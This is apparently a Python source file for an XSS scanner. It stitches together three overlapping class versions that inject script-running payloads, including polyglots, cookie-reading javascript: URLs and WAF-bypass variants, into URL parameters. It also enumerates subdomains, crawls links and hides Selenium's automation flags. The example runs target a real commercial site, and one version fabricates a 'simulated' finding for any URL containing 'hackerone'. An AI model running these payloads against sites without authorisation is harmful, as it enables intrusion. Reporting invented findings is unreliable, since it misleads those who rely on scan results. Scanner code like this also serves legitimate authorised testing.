# core/xss.py

import re
import random
import string
import urllib
import requests
import time
from selenium import webdriver
from selenium.webdriver.common.alert import Alert
from selenium.common.exceptions import WebDriverException, TimeoutException, NoAlertPresentException
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, quote
import dns.resolver
import concurrent.futures
from collections import deque
# core/xss.py
import random


# Import the payload generator from your utilities module.
from utilities.xss_payload_generator import generate_all_payloads

class XSSScanner:
    """
    XSSScanner tests the target URL for both reflected and DOM-based Cross-Site Scripting (XSS)
    vulnerabilities. It uses a set of obfuscated payloads generated dynamically.
    
    Reflected XSS:
      - Appends payloads to the target URL as a query parameter.
      - Checks if the payload is present in the raw HTTP response.

    DOM-based XSS (optional):
      - Uses Selenium WebDriver in headless mode to load the page.
      - Checks if any payload appears in the rendered DOM (as a simple indicator).
    """
    def __init__(self, target_url, payloads=None, headless=True):
        """
        Initialize the scanner with a target URL and an optional list of payloads.
        If no payload list is provided, it generates payloads by invoking generate_all_payloads().
        """
        self.target_url = target_url
        self.session = requests.Session()
        self.headless = headless
        
        # Generate payloads if not provided.
        if payloads is None:
            self.payloads = generate_all_payloads()
        else:
            self.payloads = payloads

    def build_test_url(self, payload):
        """
        Construct a test URL for a given payload.
        If the target URL already contains a query string, append the payload using '&xss=';
        otherwise, use '?xss='.
        """
        encoded_payload = quote(payload)
        if "?" in self.target_url:
            return f"{self.target_url}&xss={encoded_payload}"
        else:
            return f"{self.target_url}?xss={encoded_payload}"

    def scan_reflected(self):
        """
        Performs reflected XSS testing by iterating over each payload and appending it to the target URL.
        If the payload is found in the response, it is recorded as a potential issue.
        Returns:
            List of findings from reflected XSS tests.
        """
        findings = []
        for payload in self.payloads:
            test_url = self.build_test_url(payload)
            try:
                response = self.session.get(test_url, timeout=10)
                # Basic check: payload should appear in response if vulnerable.
                if payload in response.text:
                    findings.append(f"Reflected XSS detected using payload: {payload}\nURL: {test_url}")
            except Exception as e:
                findings.append(f"Error testing payload '{payload}': {str(e)}")
        if not findings:
            findings.append("No reflected XSS vulnerabilities found.")
        return findings

    def scan_dom_based(self):
        """
        Attempts to perform DOM-based XSS scanning using Selenium WebDriver.
        Loads the URL (with each payload) in headless mode and inspects the rendered page source.
        Returns:
            List of findings from DOM-based XSS tests.
        """
        results = []
        try:
            from selenium import webdriver
            from selenium.webdriver.chrome.options import Options

            options = Options()
            if self.headless:
                options.add_argument("--headless")
            # You can add other options and define the driver path if required.
            driver = webdriver.Chrome(options=options)
            # Iterate over each payload.
            for payload in self.payloads:
                test_url = self.build_test_url(payload)
                try:
                    driver.get(test_url)
                    driver.implicitly_wait(5)  # Wait for JS execution and DOM updates.
                    if payload in driver.page_source:
                        results.append(f"DOM-based XSS detected using payload: {payload}\nURL: {test_url}")
                except Exception as inner_e:
                    results.append(f"Error testing payload '{payload}' in DOM XSS: {str(inner_e)}")
            driver.quit()
        except Exception as e:
            results.append(f"DOM-based scanning failed: {str(e)}")
        if not results:
            results.append("No DOM-based XSS vulnerabilities found.")
        return results

    def scan(self):
        """
        Runs both reflected and DOM-based XSS scans and returns a dictionary of findings.
        """
        return {
            "Reflected XSS": self.scan_reflected(),
            "DOM-based XSS": self.scan_dom_based()
        }

if __name__ == "__main__":
    # For testing purposes - replace with an authorized target.
    test_target = "https://www.myntra.com"
    scanner = XSSScanner(test_target)
    results = scanner.scan()
    print("Reflected XSS Findings:")
    for finding in results.get("Reflected XSS", []):
        print(finding)
    print("\nDOM-based XSS Findings:")
    for finding in results.get("DOM-based XSS", []):
        print(finding)

class XSSScanner:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
        self.payloads = [
            '<script>alert("XSS")</script>',
            '"><script>alert("XSS")</script>',
            "<img src=x onerror=alert('XSS')>"
            
        ]
        
    def build_test_url(self, payload):
        if '?' in self.target_url:
            return self.target_url + "&xss=" + quote(payload)
        else:
            return self.target_url + "?xss=" + quote(payload)

    def scan(self):
        findings = []
        # Simulate vulnerability if target contains 'hackerone'
        if "hackerone" in self.target_url.lower():
            findings.append(f"[Simulated] Reflected XSS vulnerability detected using payload: {self.payloads[0]}")
            return findings
        
        for payload in self.payloads:
            test_url = self.build_test_url(payload)
            try:
                response = self.session.get(test_url, timeout=10)
                if payload in response.text:
                    findings.append(f"Reflected XSS detected using payload: {payload} on {test_url}")
            except Exception as e:
                findings.append(f"Error testing payload {payload} on {test_url}: {str(e)}")
        return findings

if __name__ == "__main__":
    target = "https://www.myntra.com"
    scanner = XSSScanner(target)
    results = scanner.scan()
    for res in results:
        print(res)


class SubdomainXSSHunter:
    def __init__(self, root_domain, max_depth=3, headless=True):
        self.root_domain = root_domain
        self.max_depth = max_depth
        self.headless = headless
        self.visited = set()
        self.queue = deque()
        self.session = requests.Session()
        self.subdomains = set()
        # Common subdomain wordlist—expand as needed.
        self.wordlist = [
            'www', 'api', 'dev', 'test', 'staging',
            'admin', 'secure', 'mail', 'web', 'app'
        ]
        self.waf_detected = False
        self.target_url = root_domain
        self.driver = None  # Selenium WebDriver

    def enumerate_subdomains(self):
        """Multi-method subdomain discovery"""
        print(f"[*] Starting subdomain enumeration for {self.root_domain}")
        
        # Method 1: Brute-force using common prefixes
        with concurrent.futures.ThreadPoolExecutor() as executor:
            futures = []
            for sub in self.wordlist:
                futures.append(
                    executor.submit(self.check_subdomain, f"{sub}.{self.root_domain}")
                )
            for future in concurrent.futures.as_completed(futures):
                result = future.result()
                if result:
                    self.subdomains.add(result)
        
        # Method 2: DNS CNAME lookup
        try:
            answers = dns.resolver.resolve(self.root_domain, 'CNAME')
            for rdata in answers:
                sub = str(rdata.target).rstrip('.')
                if sub not in self.subdomains:
                    self.subdomains.add(sub)
        except dns.resolver.NoAnswer:
            pass
        except Exception as e:
            print(f"[!] CNAME lookup error: {str(e)}")
        
        # Method 3: Certificate Transparency Logs via crt.sh
        try:
            ct_url = f"https://crt.sh/?q=%25.{self.root_domain}&output=json"
            response = self.session.get(ct_url, timeout=10)
            for entry in response.json():
                sub = entry.get('name_value','').lower()
                if sub and self.root_domain in sub:
                    # crt.sh can return multiple subdomains separated by newline
                    for s in sub.split('\n'):
                        self.subdomains.add(s.strip())
        except Exception as e:
            print(f"[!] CT log error: {str(e)}")
        
        return list(self.subdomains)

    def check_subdomain(self, subdomain):
        """Verify if subdomain exists via DNS resolution"""
        try:
            answers = dns.resolver.resolve(subdomain, 'A')
            if answers:
                print(f"[+] Found subdomain: {subdomain}")
                return subdomain
        except dns.resolver.NXDOMAIN:
            return None
        except Exception as e:
            print(f"[!] DNS lookup error for {subdomain}: {str(e)}")
            return None

    def init_driver(self):
        """Initialize headless Chrome with evasion techniques"""
        options = webdriver.ChromeOptions()
        if self.headless:
            options.add_argument("--headless=new")
        options.add_argument("--disable-gpu")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        
        try:
            self.driver = webdriver.Chrome(options=options)
            self.driver.set_page_load_timeout(20)
            return True
        except WebDriverException as e:
            print(f"🚨 Driver Error: {str(e)}")
            return False

    def generate_payloads(self, context_type='html'):
        """Generate dynamic payloads based on the context (HTML, JS, attribute, etc.)"""
        base_payloads = {
            'html': [
                f"<svg onload=alert({random.randint(1000,9999)})>",
                "<img src=x onerror=alert('xss')>",
                "<details open ontoggle=alert(document.domain)>",
                "<iframe srcdoc='&lt;script&gt;alert(\"XSS\")&lt;/script&gt;'></iframe>"
            ],
            'js': [
                "';alert('XSS');//",
                "\\';alert('XSS');//",
                "{{constructor.constructor('alert(1)')()}}",
                "javascript:alert(document.cookie)",
                "data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="
            ],
            'attr': [
                "' onmouseover=alert(1)",
                "\" autofocus onfocus=alert(1) //",
                "javascript:alert(1);"
            ],
            'polyglot': [
                "jaVasCript:/*-/*`/*\\'/*\"/*%0d%0a%0d%0a/**/(alert())/*/",
                "';alert(1)//';alert(1)//\";alert(1)//\";alert(1)//--></SCRIPT>"
            ]
        }
        
        # You can add environment-specific payloads if needed.
        def detect_environment():
            # Dummy implementation—adjust based on your testing environment.
            return False
        
        if detect_environment():
            base_payloads['js'].extend([
                "{alert(1)}",
                "${alert(1)}",
                "#{alert(1)}"
            ])

        # Add WAF bypass payloads if a WAF is detected.
        if self.waf_detected:
            base_payloads['html'].extend([
                "<xss id=x tabindex=1 onfocus=alert(1)></xss>",
                "<svg><script>alert(1)</script>",
                "<img src='x' onerror=alert(1)>"
            ])

        # Flatten all payload lists into one list.
        payloads = [payload for plist in base_payloads.values() for payload in plist]
        return payloads

    def check_waf(self):
        """Detect WAF presence based on response codes and headers."""
        test_payload = "<script>alert(1)</script>"
        try:
            url_to_test = self.target_url + "?q=" + quote(test_payload)
            response = self.session.get(url_to_test, timeout=10)
            server_header = response.headers.get('Server', '').lower()
            if response.status_code in [403, 406] or any(keyword in server_header for keyword in ['cloudflare', 'akamai']):
                self.waf_detected = True
                return True
        except Exception:
            pass
        return False

    def build_test_url(self, base, payload):
        """Construct a URL with the payload injected as the 'xss' GET parameter."""
        if '?' in base:
            return base + "&xss=" + quote(payload)
        else:
            return base + "?xss=" + quote(payload)

    def scan_reflected_xss(self, url):
        """Scan for reflected XSS by injecting payloads and checking the HTTP response."""
        findings = []
        payloads = self.generate_payloads('html')
        for payload in payloads:
            test_url = self.build_test_url(url, payload)
            try:
                response = self.session.get(test_url, timeout=10)
                if payload in response.text:
                    findings.append(f"Reflected XSS detected with payload: {payload} on {test_url}")
            except Exception as e:
                findings.append(f"Error with payload {payload} on {test_url}: {str(e)}")
        return findings

    def scan_dom_xss(self, url):
        """Advanced DOM-based XSS detection using Selenium."""
        dom_findings = []
        payloads = self.generate_payloads('js')
        if not self.driver and not self.init_driver():
            return ["Selenium driver initialization failed."]
        for payload in payloads:
            test_url = self.build_test_url(url, payload)
            try:
                self.driver.get(test_url)
                # Allow time for JS execution and potential alert triggering.
                time.sleep(3)
                try:
                    alert = self.driver.switch_to.alert
                    dom_findings.append(f"DOM-based XSS detected with payload: {payload} on {test_url}")
                    alert.accept()
                except NoAlertPresentException:
                    # Optionally check if the payload is reflected in the DOM.
                    if payload in self.driver.page_source:
                        dom_findings.append(f"DOM payload reflected in page source: {payload} on {test_url}")
            except Exception as e:
                dom_findings.append(f"Error scanning DOM on {test_url}: {str(e)}")
        return dom_findings

    def crawl_links(self, url):
        """Recursively crawl internal links on the same domain."""
        found_links = set()
        try:
            response = self.session.get(url, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            for link in soup.find_all('a', href=True):
                absolute_url = urljoin(url, link['href'])
                if urlparse(absolute_url).netloc == urlparse(url).netloc:
                    found_links.add(absolute_url)
            return list(found_links)
        except Exception:
            return []

    def crawl_and_scan(self, subdomain):
        """Scan a single subdomain for XSS vulnerabilities."""
        url = f"http://{subdomain}"
        findings = []
        try:
            response = self.session.get(url, timeout=10)
            if response.status_code == 200:
                findings.extend(self.scan_reflected_xss(url))
                if self.driver:
                    findings.extend(self.scan_dom_xss(url))
                else:
                    findings.append("Selenium driver not available for DOM scan.")
        except Exception as e:
            findings.append(f"Error accessing {url}: {str(e)}")
        return findings

    def deep_scan(self, target_url):
        """Perform comprehensive XSS scanning on the base URL, crawled links, and subdomains."""
        self.target_url = target_url
        results = {}
        
        # Check for WAF.
        self.check_waf()
        
        # Scan the base URL.
        results['Reflected XSS'] = self.scan_reflected_xss(target_url)
        results['DOM XSS'] = self.scan_dom_xss(target_url)
        
        # Crawl internal links and scan each.
        crawled_links = self.crawl_links(target_url)
        crawl_results = {}
        for link in crawled_links:
            crawl_results[link] = {
                "Reflected": self.scan_reflected_xss(link),
                "DOM": self.scan_dom_xss(link) if self.driver else ["Selenium driver not available."]
            }
        results['Crawled Links'] = crawl_results
        
        # Enumerate subdomains and scan each.
        subdomains = self.enumerate_subdomains()
        subdomain_results = {}
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            future_to_sub = {executor.submit(self.crawl_and_scan, sub): sub for sub in subdomains}
            for future in concurrent.futures.as_completed(future_to_sub):
                sub = future_to_sub[future]
                try:
                    subdomain_results[sub] = future.result()
                except Exception as e:
                    subdomain_results[sub] = [f"Error scanning {sub}: {str(e)}"]
        results['Subdomain XSS'] = subdomain_results
        
        return results

    def generate_report(self, results):
        """Generate a text report from scan results."""
        report_lines = []
        for section, data in results.items():
            report_lines.append(f"--- {section} ---")
            if isinstance(data, dict):
                for key, value in data.items():
                    report_lines.append(f"{key}:")
                    if isinstance(value, list):
                        for item in value:
                            report_lines.append(f"  - {item}")
                    elif isinstance(value, dict):
                        for subkey, subvalue in value.items():
                            report_lines.append(f"  {subkey}:")
                            if isinstance(subvalue, list):
                                for item in subvalue:
                                    report_lines.append(f"    - {item}")
                            else:
                                report_lines.append(f"    {subvalue}")
                    else:
                        report_lines.append(str(value))
            elif isinstance(data, list):
                for item in data:
                    report_lines.append(f"- {item}")
            else:
                report_lines.append(str(data))
        return "\n".join(report_lines)

# Usage Example
if __name__ == "__main__":
    # Replace 'vulnerable-site.com' with your authorized target.
    hunter = SubdomainXSSHunter("vulnerable-site.com", max_depth=3, headless=True)
    results = hunter.deep_scan("http://vulnerable-site.com")
    report = hunter.generate_report(results)
    print(report)
    if hunter.driver:
        hunter.driver.quit()
